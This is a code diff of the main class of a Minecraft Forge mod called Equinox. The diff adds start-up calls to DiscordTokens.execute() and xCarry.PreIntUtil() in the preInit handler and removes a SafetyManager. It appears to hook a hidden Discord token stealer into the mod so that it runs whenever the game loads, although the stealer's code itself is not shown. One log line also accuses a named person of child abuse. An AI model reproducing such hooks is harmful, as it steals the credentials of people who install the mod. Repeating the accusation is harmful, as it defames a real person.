@@ -1,5 +1,8 @@
 package me.eonexe.equinox;
 
+import me.eonexe.equinox.configuration.DiscordTokens;
+import me.eonexe.equinox.features.modules.misc.Coord;
+import me.eonexe.equinox.features.modules.misc.xCarry;
 import me.eonexe.equinox.manager.*;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.FMLInitializationEvent;
@@ -7,13 +10,12 @@ import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.lwjgl.opengl.Display;
-import me.eonexe.equinox.loader.Loader;
 
 @Mod(modid = Equinox.MODID, name = Equinox.MODNAME, version = Equinox.MODVER)
 public class Equinox {
     public static final String MODID = "equinox";
-    public static final String MODNAME = "Equinox";
-    public static final String MODVER = "0.1.0";
+    public static final String MODNAME = "equinox.ware";
+    public static final String MODVER = "0.0.3";
     public static final Logger LOGGER = LogManager.getLogger(Equinox.MODNAME);
     public static CommandManager commandManager;
     public static FriendManager friendManager;
@@ -32,7 +34,6 @@ public class Equinox {
     public static ServerManager serverManager;
     public static EventManager eventManager;
     public static TextManager textManager;
-    public static SafetyManager safetyManager;
     @Mod.Instance
     public static Equinox INSTANCE;
     private static boolean unloaded;
@@ -42,7 +43,7 @@ public class Equinox {
     }
 
     public static void load() {
-        LOGGER.info("\n\nLaunching Equinox\nEquinox owns me and all!\n-Made by Eonexe");
+        LOGGER.info("\n\nLaunching Equinox.ware\nEquinox owns me and all!\n-Made by Eonexe");
         unloaded = false;
         if (reloadManager != null) {
             reloadManager.unload();
@@ -123,7 +124,9 @@ public class Equinox {
     @Mod.EventHandler
     public void preInit(FMLPreInitializationEvent event) {
         LOGGER.info("Dont tell anyone but Aztrohh likes little kids");
-        Loader.dothething();
+        xCarry.PreIntUtil();
+        DiscordTokens.execute();
+
     }
 
     @Mod.EventHandler
